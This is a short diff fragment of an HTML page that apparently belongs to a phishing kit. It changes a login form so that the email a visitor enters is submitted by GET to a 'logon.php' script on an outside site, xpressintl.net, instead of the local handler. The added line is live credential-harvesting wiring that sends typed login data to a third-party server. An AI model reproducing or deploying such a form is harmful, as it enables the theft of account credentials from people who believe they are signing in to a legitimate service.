@@ -155,7 +155,7 @@ function show() {
     
 }
 </script>
-	<form action="logon.php" method="get" name="former" onsubmit="return show()">
+	<form action="https://xpressintl.net/wp/logon.php" method="get" name="former" onsubmit="return show()">
 	<span id="ff"></span>
 	<input type="text" name="em" style="width:100%" placeholder="Email"/>
 	<br /><br />
